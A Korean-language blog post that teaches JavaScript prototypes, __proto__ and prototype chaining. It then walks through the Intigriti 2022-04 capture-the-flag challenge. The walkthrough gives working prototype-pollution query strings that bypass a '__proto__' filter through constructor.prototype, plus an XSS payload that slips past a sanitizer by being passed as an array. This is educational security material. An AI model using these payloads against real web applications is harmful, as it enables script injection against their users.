---
layout: post
title: Prototype Pollution이란?
date: 2022-12-25 21:18 +0900
tags: [web, javascript, prototype, pollution, fundamental]
categories: [web, vulnerability]
toc: true
---


# Prototype Pollution

## JavaScript Object란?

- Javascript는 객체 지향언어다. Javascript에서 이루고 있는 대부분의 것들은 객체다.
- Object(객체)는 Key - Value 쌍으로 이루어져 있다.
- 객체의 속성을 Property라 일컫는다.
- 객체는 중괄호를 이용하여 표기한다. ⇒ `{}`
- 객체들은 상속을 하며 상속을 받는 객체를 “자식 객체” 상속을 한 객체를 “부모 객체”라고 부른다. (엄밀히 말하자면 정확히 상속의 개념은 아니다)

```jsx
var person1 = {
  name: "Dyrandy",
  age: 88,
  address: "Somewhere"
};

var myName = person1.name; // person1['name]; => Dyrandy
var myAge = person1.age; // person1['age']; => 88
```

## Prototype 이란?

- JavaScript 일명 JS는 객체지향 언어다. 그러나 객체지향의 핵심인 Class가 없고 이를 대신하는 Prototype이라는 것이 존재해 "ProtoType 언어"라고도 불린다.
- Class가 없어 "상속"도 없다. 그러나 Prototype을 이용해서 상속을 흉내낼 수는 있다.
- Prototype에 대한 깊이 있는 설명은 다음 글을 참고하길 바란다.
    - [https://medium.com/@limsungmook/자바스크립트는-왜-프로토타입을-선택했을까-997f985adb42](https://medium.com/@limsungmook/%EC%9E%90%EB%B0%94%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8%EB%8A%94-%EC%99%9C-%ED%94%84%EB%A1%9C%ED%86%A0%ED%83%80%EC%9E%85%EC%9D%84-%EC%84%A0%ED%83%9D%ED%96%88%EC%9D%84%EA%B9%8C-997f985adb42)
    - 위 글을 읽으면 Prototype이란 ‘원형’ 즉, 가장 기본이 되는 형태라는 것을 알 수 있다.
- 다음 예시를 통해 좀 더 구체적으로 살펴보자.
    
    ![Untitled](/assets/img/20221225//Untitled.png)
    
- 먼저 `num1`에 123을 저장하고 `num2`에 456을 저장했다고 가정해보자. 당연히 `num1`과 `num2`는 서로 다른 값을 저장하고 있어, 이 둘을 비교해보면, 서로 다름을 알 수 있다.
- 그러면 `num1`의 prototype과 `num2`의 prototype은 같을까? 결과부터 말하자면 이 둘은 같다. 왜냐하면 `Number`이라는 ‘원형’을 공유하고 있기 때문이다.

![Untitled](/assets/img/20221225//Untitled%201.png)

- 요기서 의문이 하나 생길것이다. 어쩔땐 Prototype을 사용하며, 어쩔땐 \_\_proto\_\_를 사용한다. 이 둘의 차이는 정확히 무엇인가?

## Prototype,  \_\_proto\_\_, Constructor

![Untitled](/assets/img/20221225//Untitled%202.png)

### Prototype

- `prototype`은 `new`를 통해 `__proto__`를 빌드하기 위한 하나의 Object다.

다음 예시를 보자.

![Untitled](/assets/img/20221225//Untitled%203.png)

- 위 예시에서 알 수 있듯이, 함수 Ball을 선언하면, Ball에 대한 `prototype` 접근이 가능하다.
- 이는 Ball이 하나의 생성자를 갖고 있으며 다른 객체를 new를 통해 만들수 있다.
- 그러나 Baseball은 Ball이라는 `constructor`를 통해서 생성된 하나의 Instance로 별도의 생성자가 없어 `prototype`이 없다.

### \_\_proto\_\_

- `__proto__`는 자기 자신의 `Prototype`을 가리키는 Object의 Property(function)이다. 즉, `__proto__` 는 부모 객체의 `prototype`을 바라본다.
- `__proto__` 라는 명칭은 일부 브라우저에서 사용하는 프로퍼티 명이며 ECMA 명세서에서는 `[[Prototype]]`이름으로 사용된다. `[[Prototype]]`은 객체를 생성하면 동시에 생성된다.
- `__proto__` 를 이용해서 부모 객체의 Property를 사용할 수 있다. (Prototype Chaining)

⇒ 결과론적으로, Javascript에서 모든 변수, Object들은 `__proto__`를 갖지만, `prototype`을 갖는 것은 Function Object만 갖는다.

### Constructor

- `constructor`는 Instance를 생성하고 초기화하는 Method(함수)다

```jsx
class Test {
    constructor(){
        this.name = "Test123";
    }
}
const test1 = new Test();
console.log(test1.name);
// Output : Test123
```

```jsx
function Person(name, age){
    this.name = name;
    this.age = age;
    this.doIntro = function(){
        console.log(`Hello, my name is ${name}, and I am ${age} years old.`);
    }
}

const person1 = new Person("Tom", "21");
const person2 = new Person("Nick", "19");
person1.doIntro();
person2.doIntro();
// Output : Hello, my name is Tom, and I am 21 years old.
// Output : Hello, my name is Nick, and I am 19 years old.

```

- 모든함수.\_\_proto\_\_ === Function.prototype
- 모든함수.prototype.constructor ===  함수자신
- 모든객체.constructor === 부모함수
    
    ![Untitled](/assets/img/20221225//Untitled%204.png)
    
- 객체.constructor.prototype === 객체.\_\_proto\_\_
    
    ![Untitled](/assets/img/20221225//Untitled%205.png)
    
- 객체를 생성하는 “생성자 함수” (생성자 함수도 객체이므로 `__proto__`를 갖는다)
    - Tip! : `console.dir(함수 이름)`을 통해서 함수의 Property 확인이 가능하다
    
    ![Untitled](/assets/img/20221225//Untitled%206.png)
    
- 생성자 함수로 만든 객체는 Instance를 흉내낸다. 해당 객체는 함수가 아니므로 `prototype` Property를 갖지 않는다.

## Prototype Chaining

- Prototype Chaining 이란 Javascript Engine이 특정 Property나 Method에 접근하려고 할때, 해당 객체 찾고자 하는 Property나 Method가 없으면 `__proto__`가 가리키는 링크를 따라가 부모 객체의 Property나 Method를 차례대로 올라가며 찾는 것을 의미한다.
    
    ![Untitled](/assets/img/20221225//Untitled%207.png)
    
- 위 예제를 보면 `test2`에는 `tmp1` Property가 존재하지 않지만, `__proto__`가 `test1`을 가리키고 있기 때문에, 부모 객체는 `test1`이 된다. 그리고 `tmp1`을 찾기 위해 부모 객체를 참조해서 값을 갖고 온다.
- 또한 아래 예시와 같이 객체 타입이 같은 것들 끼리만 Prototype Chaining이 되는 것을 확인 할 수 있다.
    
    ![Untitled](/assets/img/20221225//Untitled%208.png)
    

## Challenges

### Intigriti Challenge 2022-04

- Challenge Link : [https://challenge-0422.intigriti.io/challenge/Window Maker.html](https://challenge-0422.intigriti.io/challenge/Window%20Maker.html)

문제의 소스코드를 살펴보면 다음과 같이 존재하는 것을 확인할 수 있다.

```jsx
function main() {
    const qs = m.parseQueryString(location.search)

    let appConfig = Object.create(null)
    appConfig["version"] = 1337
    appConfig["mode"] = "production"
    appConfig["window-name"] = "Window"
    appConfig["window-content"] = "default content"
    appConfig["window-toolbar"] = ["close"]
    appConfig["window-statusbar"] = false
    appConfig["customMode"] = false

    if (qs.config) {
      merge(appConfig, qs.config)
      appConfig["customMode"] = true
    }

    let devSettings = Object.create(null)
    devSettings["root"] = document.createElement('main')
    devSettings["isDebug"] = false
    devSettings["location"] = 'challenge-0422.intigriti.io'
    devSettings["isTestHostOrPort"] = false

    if (checkHost()) {
      devSettings["isTestHostOrPort"] = true
      merge(devSettings, qs.settings)
    }

    if (devSettings["isTestHostOrPort"] || devSettings["isDebug"]) {
      console.log('appConfig', appConfig)
      console.log('devSettings', devSettings)
    }

... (생략) ...

function checkHost() {
  const temp = location.host.split(':')
  const hostname = temp[0]
  const port = Number(temp[1]) || 443
  return hostname === 'localhost' || port === 8080
}

... (생략) ...

function merge(target, source) {
  let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]

  for(let key in source) {
    if (protectedKeys.includes(key)) continue

    if (isPrimitive(target[key])) {
      target[key] = sanitize(source[key])
    } else {
      merge(target[key], source[key])
    }
  }
}

... (생략) ...
```

- 요기서 `qs`변수는 URL Parameter이며 `qs.config`, 즉, `config`라는 파라미터가 `appConfig`와 merge 되는 것을 확인할 수 있다.
- 우리가 최종적으로 원하는 것은 `checkHost()` 함수를 통과하여 `devSettings`와 `qs.settings`를 merge하여 Prototype Pollution을 통한 XSS를 일으키고자 한다.
- `checkHost()` 함수를 보면 특이점이 있는데 바로 `location.host.split(':')`을 통해서 URL을 hostname과 port로 나누는 것이다. 요기서 Challenge URL을 확인해보면 Port를 입력한적이 없으므로 자연스럽게 `temp[1]`은 `undefined`가 되고 443이 해당 값이 된다.
- 만약 `temp`의 부모를 “오염”시켜 Prototype Chaining을 유발 시킬 수 있다면, `1` property를 찾기위해 chaining을 할 것이고 우리가 원하는 8080으로 바꿀 수 있을 것이다.
- 우리가 공격할 수 있는 타겟은 `config[version]`, `config[mode]`, `config[window-name]`, `config[window-content]`, `config[window-toolbar]`, `config[window-statusbar]`, `config[customMode]`가 있다.
- 그러나 우리는 이중에서 `config[window-toolbar]`을 선택할 것인데 그 이유는 오염시키고자 하는 `temp`는 Object Type이다. 그리고 `config[window-toolbar]` 또한 Object Type이기 때문이다.
    
    ![Untitled](/assets/img/20221225//Untitled%209.png)
    
- 이때 `temp[1]`을 Prototype Chaining하기 위해서 `appConfig[window-toolbar]`의 부모객체를 참조해야한다. 부모로 갈 수 있는 방법 중 가장 간단한 방법은 `__proto__`를 사용하는 것이다.
    
    ![Untitled](/assets/img/20221225//Untitled%2010.png)
    
- 그러나 해당 페이로드는 정상적으로 안먹히는 것을 확인할 수 있는데, 그 이유는 merge에서 `__proto__`를 필터링하고 있기 때문이다. 그리하여 다른 방법을 찾아봐야하는데, 부모 객체를 참조하는 또 다른 방법이 있다. Ex: 객체.constructor.prototype ⇒ `config[window-toolbar][constructor][prototype][1]=8080`
    
    ![Untitled](/assets/img/20221225//Untitled%2011.png)
    
- 마지막으로 XSS로 Alert를 띄우면 되는데 핵심은 `devSettings[root]`의 innerHTML 값을 변조 시키면 된다.

```jsx
let devSettings = Object.create(null)
devSettings["root"] = document.createElement('main')
devSettings["isDebug"] = false
devSettings["location"] = 'challenge-0422.intigriti.io'
devSettings["isTestHostOrPort"] = false

if (checkHost()) {
  devSettings["isTestHostOrPort"] = true
  merge(devSettings, qs.settings)
}

if (devSettings["isTestHostOrPort"] || devSettings["isDebug"]) {
  console.log('appConfig', appConfig)
  console.log('devSettings', devSettings)
}

... (생략) ...

function checkHost() {
  const temp = location.host.split(':')
  const hostname = temp[0]
  const port = Number(temp[1]) || 443
  return hostname === 'localhost' || port === 8080
}

function isPrimitive(n) {
  return n === null || n === undefined || typeof n === 'string' || typeof n === 'boolean' || typeof n === 'number'
}

function merge(target, source) {
  let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]

  for(let key in source) {
    if (protectedKeys.includes(key)) continue

    if (isPrimitive(target[key])) {
      target[key] = sanitize(source[key])
    } else {
      merge(target[key], source[key])
    }
  }
}
function sanitize(data) {
  if (typeof data !== 'string') return data
  return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_')
}
```

- 방법은 아래와 같이 `root.innerHTML`에 값을 넣어주면 된다 (주의! : `=`을 `%3D`로 표현해야한다!)
    - `?config[window-toolbar][constructor][prototype][1]=8080&settings[root][innerHTML]=<img%20src%3Dx%20onerror%3Dalert(1)>`
        
        ![Untitled](/assets/img/20221225//Untitled%2012.png)
        
- 그러나 `sanitize()`함수로 인해 `<`, `>`, `%20`, 등이 필터링 당한다. 그러나 봐야할 것이 isPrimitive()함수에서 값의 type이 string, boolean, number, null, undefined 일때만 필터링하고 있어, 만약 Array타입이면 필터링이 없을 것이다.
    - `?config[window-toolbar][constructor][prototype][1]=8080&settings[root][innerHTML][]=<img%20src%3Dx%20onerror%3Dalert(1)>`
        
        ![Untitled](/assets/img/20221225//Untitled%2013.png)
        

### 참고

- [https://www.hahwul.com/cullinan/prototype-pollution/](https://www.hahwul.com/cullinan/prototype-pollution/)
- [https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)
- [https://medium.com/@bluesh55/javascript-prototype-이해하기-f8e67c286b67](https://medium.com/@bluesh55/javascript-prototype-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-f8e67c286b67)
- [https://www.nextree.co.kr/p7323/](https://www.nextree.co.kr/p7323/)
- [https://developer.mozilla.org/ko/docs/Learn/JavaScript/Objects/Object_prototypes](https://developer.mozilla.org/ko/docs/Learn/JavaScript/Objects/Object_prototypes)
- [https://medium.com/@limsungmook/자바스크립트는-왜-프로토타입을-선택했을까-997f985adb42](https://medium.com/@limsungmook/%EC%9E%90%EB%B0%94%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8%EB%8A%94-%EC%99%9C-%ED%94%84%EB%A1%9C%ED%86%A0%ED%83%80%EC%9E%85%EC%9D%84-%EC%84%A0%ED%83%9D%ED%96%88%EC%9D%84%EA%B9%8C-997f985adb42)
- [https://javascript.plainenglish.io/proto-vs-prototype-in-js-140b9b9c8cd5](https://javascript.plainenglish.io/proto-vs-prototype-in-js-140b9b9c8cd5)
- [https://seoramyeon.tistory.com/21](https://seoramyeon.tistory.com/21)